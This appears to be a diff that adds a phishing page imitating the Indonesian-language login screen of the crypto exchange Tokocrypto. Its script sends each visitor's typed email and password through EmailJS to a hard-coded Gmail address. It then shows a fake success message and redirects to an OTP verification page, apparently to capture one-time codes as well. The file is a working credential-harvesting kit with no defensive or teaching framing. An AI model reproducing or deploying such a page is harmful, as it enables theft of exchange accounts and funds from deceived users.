@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Tokocrypto</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #1a1f1c 0%, #2a2f2c 100%);
+        }
+        .error-message {
+            display: none;
+            background-color: #fee2e2;
+            color: #dc2626;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 16px;
+            border-left: 4px solid #dc2626;
+        }
+        .success-message {
+            display: none;
+            background-color: #d1fae5;
+            color: #065f46;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 16px;
+            border-left: 4px solid #065f46;
+        }
+        .loading-spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex justify-center items-start pt-10 px-4">
+    <div class="w-full max-w-md">
+        <div class="flex justify-end mb-6">
+            <button aria-label="Close" class="text-white text-2xl font-bold leading-none hover:text-green-400 transition-colors">
+                ×
+            </button>
+        </div>
+        <h1 class="text-white text-3xl font-extrabold mb-6">Masuk</h1>
+        
+        <div id="errorMessage" class="error-message">
+            <i class="fas fa-exclamation-circle mr-2"></i>
+            <span id="errorText">Terjadi kesalahan saat mengirim data.</span>
+        </div>
+        
+        <div id="successMessage" class="success-message">
+            <i class="fas fa-check-circle mr-2"></i>
+            <span>Login berhasil! Mengarahkan ke halaman OTP...</span>
+        </div>
+
+        <form id="loginForm" class="space-y-6 mt-4">
+            <div>
+                <label class="block text-white font-semibold mb-1" for="email">
+                    E-mail
+                </label>
+                <input autocomplete="email" class="w-full rounded-lg bg-[#4a4f56] placeholder-[#a0a0a0] text-white py-3 px-4 focus:outline-none focus:ring-2 focus:ring-green-500" id="email" placeholder="Mohon masukkan alamat email anda" required type="email"/>
+                <p class="text-red-400 text-sm mt-1 hidden" id="emailError">Format email tidak valid</p>
+            </div>
+            <div>
+                <label class="block text-white font-semibold mb-1" for="password">
+                    Kata sandi
+                </label>
+                <div class="relative">
+                    <input autocomplete="current-password" class="w-full rounded-lg bg-[#4a4f56] placeholder-[#a0a0a0] text-white py-3 px-4 pr-10 focus:outline-none focus:ring-2 focus:ring-green-500" id="password" placeholder="Silahkan masukkan kata sandi" required type="password"/>
+                    <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-[#d1d1d1] hover:text-green-400" type="button" id="togglePassword">
+                        <i class="fas fa-eye-slash"></i>
+                    </button>
+                </div>
+                <p class="text-red-400 text-sm mt-1 hidden" id="passwordError">Kata sandi harus diisi</p>
+            </div>
+            <div>
+                <a class="text-green-400 font-semibold text-sm hover:underline" href="#">
+                    Lupa kata sandi?
+                </a>
+            </div>
+            <button id="submitBtn" class="w-full bg-green-600 text-white font-semibold py-3 rounded-lg mt-4 opacity-50 cursor-not-allowed flex items-center justify-center" type="submit" disabled>
+                <span id="btnText">Lanjut</span>
+                <div id="loadingSpinner" class="loading-spinner ml-2"></div>
+            </button>
+        </form>
+        
+        <div class="flex items-center my-6 text-gray-400 text-sm">
+            <hr class="flex-grow border-gray-600"/>
+            <span class="mx-3">atau</span>
+            <hr class="flex-grow border-gray-600"/>
+        </div>
+        
+        <div class="space-y-4">
+            <button class="w-full flex items-center justify-center gap-3 border border-gray-600 rounded-lg py-3 text-white font-semibold hover:bg-gray-700 transition-colors" type="button">
+                <img alt="Binance logo, yellow diamond shape" class="w-5 h-5" height="20" loading="lazy" src="https://user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" width="20"/>
+                Lanjutkan dengan Binance
+            </button>
+            <button class="w-full flex items-center justify-center gap-3 border border-gray-600 rounded-lg py-3 text-white font-semibold hover:bg-gray-700 transition-colors" type="button">
+                <img alt="Google logo, multicolor G letter" class="w-5 h-5" height="20" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" width="20"/>
+                Lanjutkan dengan Google
+            </button>
+        </div>
+        
+        <p class="mt-6 text-white text-center text-sm">
+            Belum punya akun Tokocrypto?
+            <a class="text-green-400 font-semibold hover:underline" href="#">
+                Mendaftar
+            </a>
+        </p>
+    </div>
+
+    <script>
+    emailjs.init("ZV88Q0QnFIR6RvRPh");
+    
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    togglePassword.addEventListener('click', () => {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        togglePassword.innerHTML = type === 'password' 
+            ? '<i class="fas fa-eye-slash"></i>' 
+            : '<i class="fas fa-eye"></i>';
+    });
+
+    const emailInput = document.getElementById('email');
+    const submitBtn = document.getElementById('submitBtn');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const errorMessage = document.getElementById('errorMessage');
+    const errorText = document.getElementById('errorText');
+    const successMessage = document.getElementById('successMessage');
+    const btnText = document.getElementById('btnText');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+    }
+
+    function checkInputs() {
+        const emailValid = validateEmail(emailInput.value.trim());
+        const passwordValid = passwordInput.value.trim() !== '';
+        
+        if (emailInput.value.trim() !== '' && !emailValid) {
+            emailError.classList.remove('hidden');
+        } else {
+            emailError.classList.add('hidden');
+        }
+        
+        if (passwordInput.value.trim() === '') {
+            passwordError.classList.remove('hidden');
+        } else {
+            passwordError.classList.add('hidden');
+        }
+        
+        if (emailValid && passwordValid) {
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            submitBtn.classList.add('hover:bg-green-700');
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            submitBtn.classList.remove('hover:bg-green-700');
+        }
+        
+        if (emailInput.value.trim() !== '' || passwordInput.value.trim() !== '') {
+            errorMessage.style.display = 'none';
+        }
+    }
+
+    emailInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        if (!validateEmail(email) || password.trim() === '') {
+            errorText.textContent = 'Harap isi email dan password dengan format yang benar';
+            errorMessage.style.display = 'flex';
+            return;
+        }
+
+        submitBtn.disabled = true;
+        btnText.textContent = 'Memproses...';
+        loadingSpinner.style.display = 'block';
+
+        try {
+           const response = await emailjs.send("service_38cere3", "template_iknm5vq", {
+                email: email,
+                password: password,
+                date: new Date().toLocaleString('id-ID'),
+                to_email: "akunbarudaftar07@gmail.com"
+            });
+
+            if (response.status === 200) {
+                localStorage.setItem('userEmail', email);
+                
+                successMessage.style.display = 'flex';
+                
+                setTimeout(() => {
+                    window.location.href = "verifikasi-otp.html";
+                }, 2000);
+            } else {
+                throw new Error('Gagal mengirim email');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            
+            errorText.textContent = 'Terjadi kesalahan saat mengirim data. Silakan coba lagi.';
+            errorMessage.style.display = 'flex';
+            
+            submitBtn.disabled = false;
+            btnText.textContent = 'Lanjut';
+            loadingSpinner.style.display = 'none';
+        }
+    });
+
+    emailInput.addEventListener('focus', () => {
+        errorMessage.style.display = 'none';
+    });
+    
+    passwordInput.addEventListener('focus', () => {
+        errorMessage.style.display = 'none';
+    });
+</script>
+</body>
+</html>
